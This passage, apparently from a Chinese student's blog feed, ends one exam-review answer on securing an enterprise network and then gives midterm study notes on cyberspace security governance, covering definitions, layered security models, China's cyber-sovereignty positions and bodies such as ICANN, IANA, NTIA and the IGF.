<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%2012.png" alt="image.png"></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%2013.png" alt="image.png"></p>
<p>10.某大型企业欲建立自己的局域网，对外进行Web发布和电子商务:电子商务和数据库服务要求安全等级高。另外，企业总部是企业的核心，在进入企业总部的时候要求进行身份认证。试分析该网络安全的解决方案。</p>
<p><strong>（1）服务器配置：分成外部服务器和内部一级、二级服务器，将内部服务器设置高安全系数，外部服务器仅作为网站的外围措施的存放进行进行简单设置。之后把一级服务器与外部服务器连接实现存储重要数据。</strong></p>
<p><strong>（2）二级服务器作为企业内部使用，与一级服务器进行通讯，在确定无误后由一级服务器存入二级。</strong></p>
<p><strong>（3）分部服务器、总部服务器搭建VPN进行安全连接。</strong></p>
<p><strong>（4）环境配置:在网络的边界上应用防火墙，内外网设置相应的域间策略，在防火墙上启用web认证技术、VPN技术。另外，web站点要应用web防篡改技术，加web防篡改设备。数据库要应用防SQL注入等入侵。另外，在网络中加防毒墙。</strong></p>
]]></content>
      <categories>
        <category>复习总结</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网络空间安全治理期中整理</title>
    <url>/2025/11/25/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%B2%BB%E7%90%86%E6%9C%9F%E4%B8%AD%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong>网络空间安全治理——王小娟课件出现红色的部分</strong></p>
<p>授课：邓小龙</p>
<p>这是当时准备这门课背的资料，最后里面的内容完全没考，想看就看吧。既然整理了就放在这吧。</p>
<h1 id="第一章-引言"><a href="#第一章-引言" class="headerlink" title="第一章 引言"></a>第一章 引言</h1><p>1.国家对<strong>网络内容安全</strong>的治理越来越重视</p>
<p>2.习近平主席在中央网络安全和信息化领导小组第一次会议上讲话中指出：<strong>没有网络安全，就没有国家安全。没有信息化，就没有现代化</strong></p>
<p>3.<strong>新时代的安全风险</strong>正以远超常人想象的方式涌现，我们必须保持高度警惕。</p>
<p>4.信息化推动社会发展的同时，网络安全为其提供坚实基础和保障；<strong>没有安全，发展将失去方向与支撑，而没有发展，安全也将失去意义与动力。</strong></p>
<p>5.第四次工业革命是一场深刻的技术变革，是<strong>人工智能、物联网、机器人和基因编辑</strong>的协同发展。</p>
<p>6.它并非以单一技术为标志，而是以<strong>技术的高度集成和智能化</strong>为基础，</p>
<p>7.第四次工业革命也引发了关于<strong>隐私、公平和人类未来</strong>的严峻挑战</p>
<p>8.前三十年是颠覆性技术的爆发期，而后三十年则进入<strong>技术应用与范式固化</strong>的阶段。</p>
<p>9.安全，因三大变化而变：<strong>环境、对手、自己</strong></p>
<p>10.<strong>“网络航母”</strong>既是美实施网络作战的“统一平台”。</p>
<p>11.当今世界，网络空间已成为<strong>继陆、海、空、天之外的第五主权空间</strong>，维护网络安全成为事关国家安全、国家主权和人民群众合法权益的重大问题。</p>
<p>12.我国的网络安全形势不容乐观：<strong>中国排名全球网络安全水平倒数第13位</strong>，<strong>中国是遭到APT攻击最多的国家。</strong></p>
<p>13.网络安全已经进入到<strong>大安全时代，</strong>已经开始和<strong>国家安全，国防安全，关键基础设施安全，社会安全、金融安全、城市安全、家庭安全乃至于人身安全</strong>建立紧密的关系。</p>
<p>14.网络攻击威胁：<strong>政治安全、国防安全、工业生产安全、人身安全</strong></p>
<p>15.我们在进入大安全时代</p>
<ul>
<li>物理空间和虚拟空间已打通，<strong>网络攻击不区分虚拟还是物理空间</strong>，贯穿政务、国防、工业、经济、社会等各场景</li>
<li>漏洞无处不在，未来数以百亿计的智能设备成为攻击点，<strong>攻防不对等，防不胜防</strong></li>
<li><strong>响应速度要求越来越快</strong>，面对海量安全事件，靠人力已无法及时有效处理</li>
<li>面对具有国家背景、潜伏期长、手段隐蔽的高级威胁，<strong>原来的防护思路和技术已失效</strong></li>
</ul>
<p>16.<strong>网络空间的内容安全</strong>越来越成为<strong>公共安全中重要的一环</strong>。</p>
<p>17.在介绍<strong>网络空间安全治理的概念溯源</strong>、<strong>各国网络信息管理制度和方法</strong>的基础上，介绍技术性的<strong>针对不同类型网络信息载体</strong>（BBS、微博、微信等）的具体爬取办法</p>
<p>18.网络安全的核心在于构建<strong>以攻防对抗为视角、以整体联防为基础、以统一调度为手段、以开放运营为生态、以实战能力为检验标准</strong>的自主安全体系。</p>
<p>19.该体系强调动态防御与协同响应，<strong>拒绝孤立合规，追求在开放环境中实现真正的安全韧性</strong>。</p>
<p>20.<strong>360安全大脑核心平台</strong>是一个融合了大数据、人工智能和专家智慧的协同安全防御体系。不仅<strong>提供实时威胁感知、应急响应</strong>，还通过安全运营中心、专家服务形成闭环，最终实现从<strong>被动防御到主动智能联防</strong>的进化。</p>
<h1 id="第二章-网络空间和网络空间安全"><a href="#第二章-网络空间和网络空间安全" class="headerlink" title="第二章 网络空间和网络空间安全"></a>第二章 网络空间和网络空间安全</h1><h2 id="第一节-网络空间的定义"><a href="#第一节-网络空间的定义" class="headerlink" title="第一节 网络空间的定义"></a>第一节 网络空间的定义</h2><p>1.信息安全可以追溯至<strong>二战时期</strong>，直到20世纪40年代，<strong>信息安全和通信保密</strong>才进入学术界的视野</p>
<p>2.信息的安全威胁：<strong>自然威胁、人为威胁</strong></p>
<p>3.按照来源的信息系统威胁：<strong>自然灾害威胁、滥用性威胁、有意人为威胁</strong></p>
<p>4.信息安全十大领域<strong>（必考）：物理安全、商务连续和灾害重建计划、安全结构和模式、应用和系统开发、通信和网络安全、访问控制领域、密码学领域、安全管理实践、操作安全、法律侦察和道德规划</strong></p>
<p>5.<strong>随着全球互联网的快速发展和社会信息化程度的的快速推进</strong>，数字化社会的数量增长带来了质量的变化，以<strong>数字化、网络化、智能化、互联化、泛在化</strong>为特征的网络社会，为信息安全带来了新技术、新环境和新形态。</p>
<p>6.信息安全主要体现在现实物理社会的情况发生了变化，开始更多地体现在<strong>网络安全领域</strong>。</p>
<p>7.“网络空间”来自于<strong>“网络”</strong></p>
<p><strong>8.网络的定义（必考）</strong></p>
<ul>
<li>网络的四个基本要素：<strong>端节点、交换节点、连接边、载荷。</strong></li>
<li>一般认为，网络是由<strong>节点和连接边</strong>构成，用来表示<strong>多个对象及其相互联系的互连系统。</strong></li>
<li>现实中的信息网络，可以抽象地概括为：将各个孤立的<strong>“端节点”</strong>（信息的生产者和消费者），通过<strong>“连接边”</strong>（物理或虚拟链路）将之连接在一起，进而实现各端节点间通过<strong>“交换节点”</strong>进行转发，以实现载荷在端节点之间进行交换。</li>
<li>其中<strong>“载荷”</strong>是网络中数据与信息的表达形式，如电磁信号、光信号、量子信号、网络数据等。</li>
<li>该定义反映出“网络”的含义很广泛，不仅互联网符合这一特征，<strong>电信网、物联网、传感网、工控网、广电网</strong>等各类电磁系统所构成的信息网络都符合“网络”的描述，因而对网络的讨论就<strong>不再是仅限于互联网这么狭窄。</strong></li>
</ul>
<p>9.网络空间的直观定义</p>
<ul>
<li>网络空间是一种人造的电磁空间，其以<strong>终端、计算机、网络设备</strong>等为载体，人类通过在其上对数据进行计算、通信来实现特定的活动。</li>
<li>在这个空间中，<strong>人、机、物可以被有机地连接在一起进行互动</strong>，可以产生影响人们生活的各类信息</li>
</ul>
<p><strong>10.网络空间的定义（必考）</strong></p>
<ul>
<li><strong>网络空间是人类通过网络角色，依托信息通信技术系统来进行广义信号交互的人造活动空间。</strong></li>
<li><strong>网络角色</strong>是指产生、传输广义信号的主体，反映的是人类的意志</li>
<li><strong>信息通信技术系统</strong>包括互联网、电信网、无线网、移动网、广电网、物联网、传感网、工控网、卫星网、数字物理系统（CPS）、在线社交网络、计算系统、通信系统、控制系统等光电磁或数字信息处理设施；</li>
<li><strong>广义信号</strong>是指基于光、电、声、磁等各类能够用于表达、存储、加工、传输的电磁信号，以及能够与电磁信号进行交互的量子信号、生物信号等信号形态；这些信号通过在信息通信技术系统中进行存储、处理、传输、展示而成为信息；</li>
<li><strong>活动</strong>是指用户以信息通信技术为手段、对广义信号进行操作用以表达人类意志的行为；操作包括产生信号、保存数据、修改状态、传输信息、展示内容等，可称为“信息通信技术活动”。</li>
</ul>
<p>11.网络空间的四要素<strong>（选择题）</strong>：<strong>虚拟角色、平台、数据、活动</strong></p>
<ul>
<li>虚拟角色强调<strong>主体</strong>（即用户）、平台强调<strong>载体</strong>（即基础设施）、数据强调<strong>客体</strong>（即载荷）、活动<strong>强调</strong>行为</li>
</ul>
<p>12.（王小娟没有）网络空间的“垂直”构成要素：<strong>物理层、逻辑层、数据层、社会层</strong></p>
<p>13.（王小娟没有）网络空间的属性：<strong>虚拟性、现实性、社会性</strong></p>
<ul>
<li>网络空间的<strong>虚拟性与现实性</strong>：（1）空间：没有三维空间；物理设备（2）主体：匿名，隐藏身份：网民（3）客体：虚拟财产；信息（4）行为：行为由代码构成；信息行为</li>
<li>网络空间的<strong>社会性</strong>：网民——互动——网络社会；每个上网者和网上的网站和网页都是互联网的节点；节点连接节点，交织成网，形成网络节点联系的体系，构成互联网上的社会交往体系，即网络社会。网络社会是网络空间与现实社会的融合。</li>
</ul>
<h2 id="第二节-网络空间的分层"><a href="#第二节-网络空间的分层" class="headerlink" title="第二节 网络空间的分层"></a>第二节 网络空间的分层</h2><p>1.网络安全的三大治理领域：<strong>关键基础设施保护、社交媒体管控、数据治理</strong></p>
<p><strong>2.网络空间安全的4层次模型（必考，考过选择，没有传输层！！！）</strong></p>
<ul>
<li><strong>设备层的安全</strong>应对在网络空间中信息系统设备所面对的安全问题；</li>
<li><strong>系统层的安全</strong>应对在网络空间中信息系统自身所面对的安全问题；</li>
<li><strong>数据层的安全</strong>应对在网络空间中处理数据的同时所带来的安全问题；</li>
<li><strong>应用层的安全</strong>应对在信息应用的过程中所形成的安全问题。</li>
</ul>
<h2 id="第三节-网络空间安全的定义"><a href="#第三节-网络空间安全的定义" class="headerlink" title="第三节 网络空间安全的定义"></a>第三节 网络空间安全的定义</h2><p>1.概念兴起</p>
<ul>
<li>20世纪90年代以来，信息安全开始向网络安全聚焦，经历了一个<strong>逐步发展和逐步强化</strong>的过程。</li>
<li>在20世纪90年代广泛使用的<strong>“信息安全”</strong>一词，在进入21世纪的十多年中，已逐步<strong>与“网络安全”和“网络空间安全”</strong>并用</li>
<li>特别是2003年美国发布了<strong>网络空间战略</strong>的国家文件，<strong>“网络安全”和“网络空间安全”</strong>开始成为较之“信息安全”更为社会和业界所聚焦和关注的概念</li>
</ul>
<p><strong>2.网络空间安全的定义（大题猜测）</strong></p>
<ul>
<li>从信息论角度来看，<strong>系统是载体，信息是内涵。</strong>因此从定义上而言，<strong>网络空间是所有信息系统的集合</strong>，是人类生存的信息环境，人在其中与信息相互作用相互影响。</li>
<li>网络空间安全则是指<strong>“在网络空间中广泛存在的信息系统，可能对网络空间、物理空间、社会空间造成的安全问题”</strong>。</li>
</ul>
<p>3.网络空间安全理解</p>
<ul>
<li>从网络空间安全的内涵与外延而言，网络空间安全可以指称<strong>信息安全或网络安全</strong>，但侧重点是与陆、海、空、太空等并行的空间概念，并一开始就具有<strong>军事性质</strong></li>
<li>与信息安全相比较，网络安全与网络空间安全反映的信息安全<strong>更立体、更宽域、更多层次，也更多样，更能体现出网络和空间的特征</strong>，并与其他安全领域更多地渗透与融合。</li>
</ul>
<p><strong>2.网络空间安全的四项主要内容（必考）（问大题直答第一部分）</strong></p>
<aside>
📔

<p><strong>（1）物理层安全：</strong>主要研究针对<strong>各类硬件的恶意攻击和防御技术，</strong>以及硬件设备在网络空间中的安全接入技术。在恶意攻击和防御方面的主要研究热点有<strong>侧信道攻击、硬件木马检测方法和硬件信任基准</strong>等；在设备接入安全方面主要研究基于设备指纹的身份认证、信道及设备指纹的测量与特征提取等。此外，物理层安全还包括<strong>容灾技术、可信硬件、电子防护技术、干扰屏蔽技术等</strong>。</p>
</aside>

<ul>
<li>侧信道（系统中无意泄露<strong>物理信号</strong>）攻击的防御：不直接破解算法，而是利用系统实现的<strong>物理</strong>或行为特征推断机密信</li>
<li>硬件木马检测方法：静态检测<strong>（看外观）、</strong>动态检测<strong>（看输出）、</strong>侧信道检测<strong>（听信号）</strong></li>
</ul>
<aside>
📔

<p>（2）系统层安全：包括<strong>系统软件安全、应用软件安全、体系结构安全</strong>等层面的研究内容, 并渗透到云计算、移动互联网、物联网、工控系统、嵌入式系统、智能计算等多个应用领域，具体包括<strong>系统安全体系结构设计、系统脆弱性分析、软件的安全性分析，智能终端的用户认证技术、恶意软件识别，云计算环境下虚拟化安全分析和取证</strong>等重要研究方向。</p>
</aside>

<ul>
<li><strong>系统脆弱性分析</strong>（给系统“体检”找漏洞）关键技术：<strong>漏洞扫描技术、渗透测试技术、静态&#x2F;动态分析技术</strong></li>
</ul>
<aside>
📔

<p>（3）网络层安全：该层研究工作的主要目标是<strong>保证连接网络实体的中间网络自身的安全，</strong>涉及各类<strong>无线通信网络、计算机网络、物联网、工控网等网络的安全协议、网络对抗攻防、安全管理、取证与追踪等方面的理论和技术。</strong></p>
</aside>

<aside>
📔

<p>（4）数据层安全：数据层安全研究的主要目的是保证<strong>数据的机密性、完整性、不可否认性、匿名性</strong>等, 其研究热点已渗透到社会计算、多媒体计算、电子取证、云存储等多个应用领域。具体包括<strong>数据隐私保护和匿名发布、数据的内在关联分析、网络环境下媒体内容安全、信息的聚集和传播分析、面向视频监控的内容分析、数据的访问控制</strong>等。</p>
</aside>

<h2 id="第四节-网络空间安全治理的定义"><a href="#第四节-网络空间安全治理的定义" class="headerlink" title="第四节 网络空间安全治理的定义"></a>第四节 网络空间安全治理的定义</h2><p><strong>1.网络空间安全治理的基本概念（大题推测）</strong></p>
<p>（1）治理：治理和国家治理是源于西方的学术概念，从概念上而言，是<strong>“各种管理共同事务方式的总和，是不同利益得以调和的持续行动过程”。</strong>研究上而言，认为治理即治国理政，一项发展性极强的管理活动和一种因时而进、因势而新的<strong>社会现象</strong>。网络安全治理<strong>是国家治理思想在网络空间的提升拓展。</strong></p>
<p>（2）中国的网络空间安全治理主张：<strong>主权原则</strong>应适用于网络空间；应该强化<strong>联合国</strong>在网络空间安全治理中的地位；反对<strong>网络空间单边主义与双重标准；</strong>倡导<strong>平等共治的命运共同体模式。</strong></p>
<p>3.记住几个事件：世界第一个计算机病毒：<strong>莫里斯蠕虫；</strong>网络战：<strong>爱沙尼亚网络战；</strong>攻击硬件和工控网：<strong>伊朗震网（Stuxnet）病毒事件；</strong>社会恐慌：<strong>乌克兰电力系统遭受攻击；</strong>攻击内网：<strong>永恒之蓝勒索病毒全球爆发；</strong>美国也不能幸免：网络攻击致半个美国互联网瘫痪；个人信息保护：数据泄露事件频发；网络意识形态安全：欧美的反宣传法案；美国网络霸权：棱镜门事件；中美网络空间博弈：美国起诉中国军官事件</p>
<p>4.中国的网络空间安全治理主张（考过选择）：<strong>主权原则</strong>应适用于网络空间、应该<strong>强化联合国</strong>在网络空间安全治理中的地位、<strong>反对网络空间单边主义与双重标准、倡导平等共治的命运共同体模式</strong></p>
<p><strong>5.中国的网络空间安全治理的主要体现点（大题推测）</strong></p>
<ul>
<li><strong>倡导网络空间命运共同体理念</strong>：提出全球互联网国际治理的<strong>“四项原则”和“五点主张”</strong>，丰富<strong>“网络主权”</strong>概念，倡导<strong>“网络空间命运共同体”</strong>理念，发布<strong>《网络空间国际合作战略》、《网络空间安全战略》</strong></li>
<li><strong>举办世界互联网大会备受瞩目</strong>：主动打造互联网治理国际平台，提升规则制定权和国际影响力。<strong>已成功举办五届大会</strong>，加快了网络主权、网络空间命运共同体等理念的国际传播</li>
<li><strong>网络空间交流与合作不断深化</strong>：互联网国际交流与合作不断深化，“21世纪数字丝绸之路”建设初见成效</li>
<li><strong>互联网机构任职取得可喜进展</strong></li>
</ul>
<p><strong>6.习近平网络空间安全治理观（大题推测）</strong></p>
<ul>
<li><strong>“一体两翼双轮驱动”</strong>的网络安全战略观：所谓“一体”，<strong>即网络强国的目标主体</strong>，这是国家战略，也是目标愿景；所谓“两翼双轮驱动”，<strong>即“网络安全”和“信息化”。</strong></li>
<li><strong>“网络空间命运共同体”</strong>的网络安全<strong>共建</strong>观：<strong>依赖于现实世界人们的共同推动和努力，在虚拟空间与现实世界欲构建的命运共同体之间，必然存在着紧密的逻辑联系。</strong></li>
<li><strong>“以人民为中心发展”</strong>的网络安全<strong>利益</strong>观：<strong>“国家安全工作归根结底是保障人民利益，要坚持国家安全一切为了人民、一切依靠人民，为群众安居乐业提供坚强保障。”</strong></li>
<li><strong>“核心技术自主创新”</strong>的网络安全<strong>技术</strong>观。<strong>“网络安全的本质在对抗，对抗的本质在攻防两端能力较量。”</strong></li>
<li>“<strong>尊重网络主权反对霸权”</strong>的网络安全<strong>国家</strong>观。<strong>互联网在带来利好的同时，也使网络安全风险日益突出。</strong>基于维护国家安全，网络安全治理<strong>坚持尊重网络主权，反对网络霸权，坚持多样化的发展道路，充分尊重各自选择的网络运行模式和管理政策机制</strong>显得尤为重要。</li>
<li><strong>“聚天下网信英才而用之”</strong>的网络安全<strong>人才</strong>观。<strong>“人才是第一资源”，“要聚天下英才而用之，为网信事业发展提供有力人才支撑”。</strong>努力培养更多掌握核心技术的网信创新人才。</li>
</ul>
<h2 id="第五节-网络空间主权"><a href="#第五节-网络空间主权" class="headerlink" title="第五节 网络空间主权"></a>第五节 网络空间主权</h2><p>1.我国网络空间的主权主张法律三驾马车：<strong>网络安全法、数据安全法、个人信息保护法</strong></p>
<p>2.国家主权具有以下“444”特征。</p>
<p>四个基本要素：<strong>领土、人口、资源与政权；</strong></p>
<p>四项基本权力：<strong>独立权、平等权、自卫权与管辖权；</strong></p>
<p>四条基本原则：<strong>尊重主权、互不侵犯、互不干涉内政、主权平等。</strong></p>
<p>网络空间主权作为国家主权的一个延伸，自然也继承了这些特征。</p>
<p>3.我国网络安全法的基本原则，网络主权原则</p>
<ul>
<li>所谓网络主权，简单来讲，就是一国国家主权在网络空间中的自然延伸和表现。</li>
<li>对内，网络主权指的是<strong>国家独立自主地发展、监督、管理本国互联网事务；</strong></li>
<li>对外，网络主权指的是<strong>防止本国互联网受到外部入侵和攻击。</strong></li>
</ul>
<h1 id="第三章-国内外网络空间安全治理现状"><a href="#第三章-国内外网络空间安全治理现状" class="headerlink" title="第三章 国内外网络空间安全治理现状"></a>第三章 国内外网络空间安全治理现状</h1><h2 id="第一节-网络空间安全治理溯源和ICANN"><a href="#第一节-网络空间安全治理溯源和ICANN" class="headerlink" title="第一节 网络空间安全治理溯源和ICANN"></a>第一节 网络空间安全治理溯源和ICANN</h2><p><strong>1.互联网治理的概念（大题推测）</strong></p>
<p>（1）网络空间安全治理的前身其实是<strong>“互联网治理”</strong>，而“互联网治理”则最初来自于2005年11月的第二阶段<strong>信息社会世界峰会(WSIS)<strong>，在这次大会上，对“互联网治理”首次给出了官方的定义。随后这一定义被</strong>联合国互联网治理工作组(WGIG)<strong>所使用，一直沿用至今。WGIG报告的第II部分对互联网治理做出如下定义：</strong>“政府、私有部门、公民社会通过制定程序和规划来塑造互联网的演进和使用；互联网治理是指在此过程中，他们共同认可的原则、规范、规则以及决议的发展和应用。”</strong></p>
<p>（2）其中“治理”一词的使用值得深入推敲，在2003年日内瓦召开的第一阶段峰会中，各国就如何解读 “治理”发生了严重的分歧。<strong>很多国家代表将“治理”等同于“政府管理”。</strong>实际上二者在语义上也可以通用。然而从<strong>“多元利益共同体主义”</strong>的角度出发，<strong>互联网治理不仅仅有政府的参与，后者还应当与私有部门，甚至是公民社会协商合作</strong>。从定义的理念上“互联网治理”是一个主体平等协商的过程，而不仅仅限于政府议程。治理并非政府管理，更不是管控。</p>
<p>2.互联网治理的概念总结</p>
<ul>
<li>互联网治理是政府、私营部门和公民社会根据各自的作用制定和实施的，旨在规范互联网发展和使用的共同原则、准则、规则、决策程序和方案。</li>
<li>治理与规制、管制、监管不同</li>
</ul>
<p>治理主体多元性：政府、企业、民间组织、技术社群、学术界、国际组织和<strong>其他利益相关方</strong></p>
<p>治理手段多样性：法律、行政、经济、<strong>技术、自律</strong></p>
<p>治理的路径协同性：从单向管理转向双向，从线下转向线上线下融合，从单纯的政府监管向更加注重社会协同治理转变。网络治理侧重各利益相关主体之间的<strong>制度规范和权力制衡</strong>，注重各利益主体之间的相互依存，和谐发展。</p>
<p>3.互联网网络治理模式：</p>
<ul>
<li>一是主张网络空间自我约束、排斥外部干预的<strong>“自治或自由主义模式”</strong>；</li>
<li>二是强调以技术架构及代码规则为核心控制手段的<strong>“软件代码治理模式”</strong>；</li>
<li>三是主张将现实法律与社会规范延伸至网络空间的<strong>“同现实世界一样的治理模式”</strong>；</li>
<li>四是倡导政府、企业、民间组织等多方共同参与协商的<strong>“多利益相关方治理模式”。</strong></li>
</ul>
<p>4.互联网治理的核心范围</p>
<ul>
<li>全球所有利益相关方针对网络空间涉及的<strong>政治、经济、军事、文化、社会</strong>等各层次问题，围绕<strong>发展与安全</strong>两大方面，<strong>搭建磋商平台和机制，开展对话和磋商进程。</strong></li>
<li><strong>关键基础设施保护（含IP地址管理）、社交媒体管控、数据治理（跨境数据流动）</strong>是互联网治理三大核心领域。</li>
<li>此外还有<strong>网络运行安全、隐私保护</strong>等领域。</li>
</ul>
<p>（一）威胁网络运行安全的因素：<strong>恶意程序（木马和僵尸、网络移动互联网恶意程序、物联网智能设备恶意程序）、网络漏洞（既是网络安全风险，又是国家战略性资源）、网络攻击</strong></p>
<p>（二）关键信息基础设施的范围：</p>
<p><strong>《网络安全法》</strong></p>
<ul>
<li><strong>公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务</strong>等重要行业和领域。</li>
<li>其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害<strong>国家安全、国计民生、公共利益的关键信息基础设施。</strong></li>
</ul>
<p><strong>《网络空间安全战略》</strong></p>
<ul>
<li>包括但不限于<strong>提供公共通信、广播电视传输等服务的基础信息网络，能源、金融、交通、教育、科研、水利、工业制造、医疗卫生、社会保障、公用事业等领域和国家机关的重要信息系统，重要互联网应用系统等。</strong></li>
</ul>
<p>5.国外关键信息基础设施的范围</p>
<ul>
<li>2013年美国《关键基础设施安全和可恢复之总统政策令》确立了16个关键基础设施，具体包括：<strong>化学、商业设施、通信、关键制造、大坝、国防工业基地、应急服务、能源、金融服务、食品和农业、政府设施、医疗和公共卫生、信息技术、核反应堆和材料及废料、运输系统、水和废水系统。</strong></li>
<li>英国包括<strong>通讯、应急服务、能源、金融、食品、政府、健康、运输与水</strong>九大行业。</li>
<li>日本包括<strong>数据通讯、金融、航空、铁路、电力、天然气、政府与行政服务、医疗、水务与后勤保障</strong>十大行业。</li>
<li>德国包括<strong>能源、信息技术与电信、运输、健康、水、食品、金融与保险、国家与公共行政、传媒与文化</strong>九大行业。</li>
</ul>
<p>6.互联网治理的框架</p>
<ul>
<li><strong>互联网治理涉及诸多繁杂、交叉、甚至相互交叉的领域。</strong>互联网治理需要做的首要任务是<strong>在繁杂的图景中梳理出关于不同机构、结构以及程序的关系，使互联网治理的框架清晰地呈现出来。</strong></li>
<li>“三元划分”：<strong>以互联网为中心”（技术层面）、“以互联网用户为中心”（使用层面）以及“不以互联网为中心”（不涉及互联网，与政策有关）三类。</strong></li>
</ul>
<blockquote>
<p><em>IANA、NTIA、ICANN具体名称、英文缩写、所负责业务要会（考大题）</em></p>
</blockquote>
<p>7.互联网数字分配机构（The Internet Assigned Numbers Authority, IANA）</p>
<p>（1）目前是<strong>互联网名称与数字地址分配机构</strong>的一个部门。</p>
<p>（2）在ICANN创立之前，IANA主要由南加州大学的信息科学研究院依据其与美国国防部签署的合同负责管理。<strong>ICANN成立之后与美国商务部签署了另一份合同，并至此正式在美国政府的监督下开始管理互联网。</strong>管理权移转之后，IANA的职权也相应地移交给了ICANN下设的公共技术标识组织PTI。</p>
<p>（3）IANA的三大职责：<strong>数字资源、域名、协议参数管理</strong></p>
<ul>
<li>数字资源：IANA负责<strong>协调全球的互联网协议地址系统，也即地址。</strong>目前有两种主要的IP地址类型：ipv4以及ipv6。除此之外，IANA还负责<strong>将自治系统号码分配给区域互联网注册机构。</strong></li>
<li>域名：IANA的另一个职责是<strong>负责管理根区数据库</strong>。RZD中包含了所有的顶级域名，常见的通用TLDs包括.gov、.edu、.com、.org、.net等。域名系统是<strong>一个分布式数据库，通过将域名和IP地址相互映射，能够使用户通过域名更方便地访问互联网，</strong>而不需要记住IP数串。</li>
<li>协议参数管理：IANA还负责<strong>互联网协议中很多的代码和编号系统。</strong>这一工作需与互联网工程任务组协同完成。</li>
</ul>
<p>8.美国国家电信与信息管理局（The National Telecommunications and Information Administration, NTIA）</p>
<p>（1）是<strong>美国商务部下设的一个行政机构，</strong>主要负责向<strong>美国总统提供电信与信息政策相关的建议。</strong></p>
<p>（2）NTIA的政策制定主要侧重于扩大美国宽带互联网接入以及频谱使用等。管理权移转之前，ICANN<strong>根据合同在NTIA的监督下开展互联网域名系统的管理。</strong></p>
<p>9.互联网名称与数字地址分配机构（The Internet Corporation for Assigned Names and Numbers,ICANN）</p>
<p>（1）成立于1998年<strong>，负责监管全球范围内IP地址的分配、自治系统号码的分配、域名系统中的根区管理等。</strong></p>
<p>（2）在2016年10月ICANN与NTIA的合同到期后，前者正式脱离美国政府的控制，成为了“国际多元利益共同体”的代表。</p>
<p>10.ICANN互联网治理框架（大题）</p>
<ul>
<li>NTIA明确提出了<strong>未来互联网治理的四大原则：多元利益共同体模式；保障因特网域名系统的安全、稳定和弹性；满足世界范围内消费者和合作者的需求和期待；保障因特网的开放性</strong></li>
<li>首先，在技术层面，互联网治理要实现域名系统的<strong>安全、稳定、弹性</strong>。</li>
<li>其次，在使用层面，<strong>需要满足消费者以及合作者的需求和期待。</strong></li>
<li>再次，<strong>因特网的开放性</strong>是互联网治理的重要目标之一。这里所谓“开放性”具有多维度的属性，不仅仅是指技术上的开放性 ，还包括经济（跨境供给与消费）、社会（人权）和其他维度（用户赋权、分布式控制、包容式治理等）。</li>
<li>最后，NTIA明确表示，不接受将管理权移转给政府或政府间组织，未来的互联网治理应当采用<strong>“多元利益共同体模式”</strong>。这里利益共同体包括各个国家、私有部门、公民社会、政府间组织、以及国际组织等。</li>
</ul>
<h2 id="第二节-网络空间安全治理的相关国际组织"><a href="#第二节-网络空间安全治理的相关国际组织" class="headerlink" title="第二节 网络空间安全治理的相关国际组织"></a><strong>第二节 网络空间安全治理的相关国际组织</strong></h2><p>1.全球互联网治理的历史沿革，是一部<strong>从技术自治走向多元共治的演进史</strong>。这一进程既反映了<strong>互联网技术与应用的飞速发展，也深刻揭示了规则制定权、数据主权和数字权利如何成为全球博弈的核心焦点。</strong></p>
<p>2.模式</p>
<p>（1）ICANN的治理结构是<strong>多利益相关方协作模式的典范</strong>。其核心是代表最终决策权的董事会，外围环绕着提名委员会、各类咨询委员会（及关键支持组织。</p>
<p>（2）这些组织分别代表<strong>政府、技术社群、商业与非商业机构等不同利益群体</strong>，通过制度化的咨询与提案机制参与政策制定。整个体系既保持了核心决策效率，又通过多层次、广覆盖的参与机制，<strong>体现了全球互联网治理中的多元平衡与专业性。</strong></p>
<p><strong>3.联合国互联网治理论坛（大题必考）</strong></p>
<p>（1）联合国互联网治理论坛（IGF）是联合国于2006年设立的多边对话机制，旨在为全球各界代表，<strong>包括政府、企业、技术社群、学术界及公民社会</strong>，提供一个开放、包容、平等的平台，共同探讨互联网治理中的关键议题。其核心使命是促进对话、分享最佳实践、应对数字时代的政策挑战，如数据安全、数字鸿沟、人权与伦理等。</p>
<p>（2）IGF不产生谈判成果或约束性决议，而是通过倡导多方协作与共识构建，推动全球互联网朝着更具韧性、公平和可持续的方向发展</p>
<p>（3）<strong>中国于2020年正式启动国家级IGF</strong>，是经联合国IGF认可的NRIs之一。中国IGF的<strong>秘书处设在中国互联网协会</strong>，中国IGF主任为中国互联网协会<strong>副理事长黄澄清</strong>。在中国互联网络信息中心、中国信息通信研究院、阿里巴巴、华为、清华、北大、复旦、北邮、北师大、伏羲智库等近40个国内各利益相关方的支持下开展工作，致力于<strong>促进中国社群之间以及与国际各方在互联网治理相关方面的交流互动与合作</strong>，凝聚中国社群共识并产出方案、成果，宣介中国互联网治理理念和经验。自成立以来，中国IGF已经连续举办四届中国互联网治理论坛年会活动，凝聚了中国关心互联网治理议题的多方机构和专家，积极开展国际交流，参与联合国IGF年会、休会期间活动。</p>
<ul>
<li>了解一下就行：2023年IGF年会开幕，联合国秘书长古特雷斯视频出席致辞，联合国副秘书长李军华和日本首相岸田文雄出席致辞。岸田文雄表示，<strong>互联网应开放、自由、全球化、可互操作、安全，并再次提及推动DFFT（可信数据自由流动）。</strong>2025年6月23日至27日在挪威首都奥斯陆附近的利勒斯特伦举行。2025年6月24日，举行了论坛的开幕式，联合国秘书长古特雷斯视频致辞。论坛以“共建数字治理”为主题，围绕人工智能、新兴技术、数字信任与安全、数据保护、数字基础设施建设等议题展开多场讨论。</li>
</ul>
<p>4.英国政府组建了<strong>开放数据研究所和哈璀超级计算中心</strong>，<strong>将网络安全融入计算机科学和学位管理。</strong></p>
